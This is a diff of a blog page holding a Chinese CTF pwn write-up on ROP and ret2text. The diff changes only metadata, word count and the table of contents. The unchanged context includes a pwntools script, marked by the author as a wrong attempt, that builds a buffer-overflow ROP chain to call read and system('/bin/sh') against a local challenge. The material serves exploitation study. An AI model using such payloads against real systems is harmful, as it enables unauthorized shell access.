@@ -23,7 +23,7 @@
   <meta property="og:image:alt" content="pwn--rop+ret2text · whymm">
   
   <meta property="article:published_time" content="2026-11-20T14:00:00.000Z">
-  <meta property="article:modified_time" content="2026-11-22T09:15:00.908Z">
+  <meta property="article:modified_time" content="2026-11-22T09:22:24.728Z">
   
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="pwn--rop+ret2text · whymm">
@@ -109,7 +109,7 @@
           <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7.5V12l3 2"/></svg>
           7 分钟阅读
         </span>
-        <span class="post-meta-item">2449 字</span>
+        <span class="post-meta-item">2433 字</span>
         
         
         <span class="post-meta-item post-author">
@@ -134,11 +134,11 @@
         
         <details class="toc-mobile">
           <summary>目录</summary>
-          <div class="toc-mobile-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E2%80%93rop-ret2text"><span class="toc-text">pwn–rop+ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93shellcode"><span class="toc-text">pwn–shellcode</span></a></li></ol></li></ol></div>
+          <div class="toc-mobile-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93shellcode"><span class="toc-text">pwn–shellcode</span></a></li></ol></div>
         </details>
         
 
-        <div class="post-content" id="postContent"><h1 id="pwn–rop-ret2text"><a href="#pwn–rop-ret2text" class="headerlink" title="pwn–rop+ret2text"></a>pwn–rop+ret2text</h1><p>依旧是上周卡我7，8个小时的题目</p>
+        <div class="post-content" id="postContent"><p>依旧是上周卡我7，8个小时的题目</p>
 <p>首先我们要调用<code>read</code>函数将<code>/bin/sh</code>写入<code>.bss</code>段，而且还只能写24字节</p>
 <p>错误示例：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">34085</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">nameplate_addr=<span class="number">0x4040A0</span></span><br><span class="line">takemassage_addr=<span class="number">0x401260</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x401250</span></span><br><span class="line">system_plt=<span class="number">0x401080</span></span><br><span class="line">read_plt = <span class="number">0x401090</span></span><br><span class="line">payload1=<span class="string">b&#x27;A&#x27;</span>*<span class="number">88</span>+p64(pop_rdi_addr)+p64(nameplate_addr)+p64(read_plt)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span>+p64(pop_rdi_addr)+p64(nameplate_addr)+p64(system_plt)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive</span><br></pre></td></tr></table></figure>
@@ -248,7 +248,7 @@
       <aside class="post-aside">
         <div class="toc-wrap">
           <div class="toc-title"><span>目录</span><b>TOC</b></div>
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E2%80%93rop-ret2text"><span class="toc-text">pwn–rop+ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93shellcode"><span class="toc-text">pwn–shellcode</span></a></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93shellcode"><span class="toc-text">pwn–shellcode</span></a></li></ol>
         </div>
       </aside>
       
